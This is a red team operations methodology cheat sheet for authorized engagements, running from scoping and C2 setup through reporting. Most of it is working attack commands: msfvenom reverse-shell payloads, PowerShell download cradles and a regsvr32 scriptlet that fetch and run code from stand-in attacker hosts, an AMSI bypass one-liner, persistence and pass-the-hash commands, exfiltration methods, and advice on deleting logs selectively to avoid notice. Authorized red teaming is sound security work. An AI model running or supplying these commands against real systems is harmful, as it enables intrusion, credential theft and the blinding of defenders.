# Red Team Operations Methodology

## Planning & Scoping
- Define objectives: specific crown jewels (domain admin, PII database, financial system access)
- Rules of Engagement: approved hours, no-touch systems, emergency contacts, deconfliction process
- Threat model selection: map adversary TTPs using MITRE ATT&CK Navigator, select techniques relevant to client's threat landscape
- Establish communication channels: encrypted comms (Signal/Wire), daily sitrep cadence, emergency abort procedure
- Legal: signed authorization letter, scope document with IP ranges/domains/physical locations explicitly listed

## Infrastructure Setup
- Redirector with Apache mod_rewrite: `a2enmod rewrite proxy proxy_http ssl` then configure `.htaccess` to forward only valid C2 traffic patterns, block sandboxes by User-Agent/IP
- Domain categorization: register domain 30+ days before engagement, host benign content to get categorized as "Business" in web filters
- Cobalt Strike teamserver: `./teamserver YOUR_IP PASSWORD malleable.profile`
- Sliver C2: `sliver-server` then `generate --mtls YOUR_IP --os windows --arch amd64 --save implant.exe`
- Mythic C2: `./mythic-cli start` then create payload via web UI at `https://MYTHIC_IP:7443`
- Domain fronting: use CDN (CloudFront/Azure CDN) as C2 redirector, set Host header to CDN-fronted domain while connecting to high-reputation CDN IP
- DNS over HTTPS C2: configure C2 to use DNS queries tunneled over HTTPS via `dns.google` or `cloudflare-dns.com`
- Malleable C2 profile: customize HTTP request/response to mimic legitimate traffic (jQuery, Microsoft update, Slack API)

## Initial Access
- Spear-phishing with macro payload: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=REDIR LPORT=443 -f vba-psh` embed in Office document
- HTA delivery: `mshta http://ATTACKER/payload.hta` — bypasses Mark-of-the-Web restrictions
- LNK payload: craft LNK file executing PowerShell download cradle: `powershell -ep bypass -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://REDIR/stager.ps1')"`
- ISO/IMG container: package LNK + DLL inside ISO to bypass MOTW (pre-2022 patch)
- HTML smuggling: embed base64-encoded payload in HTML, JavaScript reconstructs and triggers download on open
- Credential stuffing from breach data: collect credentials from breach databases, spray against OWA/VPN/SSO with `trevorspray` or `sprayhound`
- Watering hole: compromise a site frequented by target employees, inject exploit or credential harvester

## Execution & Defense Evasion
- AMSI bypass (PowerShell): `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)`
- ETW patch to blind defenders: patch `EtwEventWrite` in `ntdll.dll` to return immediately
- AppLocker bypass: use trusted binaries — `msbuild.exe`, `installutil.exe`, `regsvr32.exe /s /n /u /i:http://ATTACKER/payload.sct scrobj.dll`
- WDAC bypass: identify allowed signers, sign payload with leaked/stolen code-signing cert, or use LOLBAS
- In-memory execution: `Invoke-Expression (New-Object Net.WebClient).DownloadString('https://REDIR/payload.ps1')` — nothing touches disk
- Process injection: `CreateRemoteThread` into `explorer.exe` or `svchost.exe` to blend with legitimate processes
- PPID spoofing: create process with spoofed parent PID to evade parent-child relationship detections
- Syscall unhooking: load fresh `ntdll.dll` from disk to replace EDR-hooked copy: `NtMapViewOfSection` from `\KnownDlls\ntdll.dll`
- Sleep obfuscation: encrypt implant memory during sleep intervals to evade memory scanners (Ekko/Foliage techniques)
- Timestamp stomping: `timestomp.exe implant.exe -m "01/15/2023 08:30:00"` to match surrounding files

## Persistence
- Scheduled task: `schtasks /create /tn "WindowsUpdate" /tr "C:\ProgramData\update.exe" /sc onlogon /ru SYSTEM`
- Registry run key: `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "C:\ProgramData\update.exe"`
- WMI event subscription: `__EventFilter` + `__EventConsumer` + `__FilterToConsumerBinding` for process-start trigger
- DLL side-loading: place malicious DLL alongside vulnerable legitimate binary (e.g., `version.dll` next to Teams.exe)
- COM hijacking: modify `HKCU\Software\Classes\CLSID\{GUID}\InprocServer32` to point to implant DLL
- Golden certificate: extract CA private key via `certipy ca -ca 'CA-NAME' -backup` then forge certificates for any user
- SSH authorized_keys on Linux: `echo "ssh-rsa ATTACKER_KEY" >> /root/.ssh/authorized_keys`

## Lateral Movement
- Pass-the-Hash: `crackmapexec smb TARGETS -u admin -H NTLM_HASH --exec-method smbexec -x "whoami"`
- Pass-the-Ticket: `Rubeus.exe ptt /ticket:KIRBI_BASE64` then access target resources
- Over-pass-the-hash: `Rubeus.exe asktgt /user:admin /rc4:HASH /ptt` converts NTLM to Kerberos TGT
- WinRM: `evil-winrm -i TARGET -u admin -H HASH`
- PsExec: `impacket-psexec DOMAIN/admin@TARGET -hashes :HASH`
- DCOM: `impacket-dcomexec DOMAIN/admin@TARGET -hashes :HASH`
- RDP with restricted admin: `xfreerdp /v:TARGET /u:admin /pth:HASH`

## Exfiltration
- DNS exfiltration: `dnscat2` client connects to attacker DNS server, tunnels data in DNS queries
- HTTPS C2 channel: exfil data through existing C2 connection, chunk large files
- Cloud storage: upload to attacker-controlled S3/Azure Blob/GCS using stolen or provisioned credentials
- Steganography: embed data in images with `steghide embed -cf image.jpg -ef secret.txt`
- Email: use compromised mailbox to send data to external address (mimics normal behavior)

## OPSEC Discipline
- Never run tools from disk — always in-memory or from memory-mapped shares
- Delete event logs selectively, not wholesale (wholesale deletion is more suspicious)
- Use legitimate admin tools where possible (RDP, WinRM, PowerShell Remoting) over custom implants
- Rotate C2 domains and IPs if blue team burns infrastructure
- Monitor blue team actions: check for new firewall rules, EDR alerts, password resets that indicate detection
- Use separate infrastructure per engagement phase (phishing domain != C2 domain != exfil domain)

## Reporting
- Objective-based narrative: did the red team achieve the stated objectives? What was the attack path?
- Full attack chain timeline: initial access timestamp through objective completion
- Each finding: title, risk rating, MITRE ATT&CK mapping, detailed steps to reproduce, evidence screenshots, remediation
- Executive summary: 1-page for leadership with business impact in plain language
- Detection gaps: what the SOC missed, what was detected, time-to-detect metrics
- Remediation priority: rank fixes by attack-path criticality, not individual finding severity
